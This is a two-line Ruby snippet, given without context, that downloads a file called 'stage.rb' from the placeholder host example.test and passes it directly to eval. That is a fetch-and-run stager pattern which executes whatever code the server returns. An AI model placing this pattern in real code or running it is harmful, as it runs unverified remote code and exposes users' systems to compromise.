require "net/http"
eval(Net::HTTP.get(URI("https://example.test/stage.rb")))
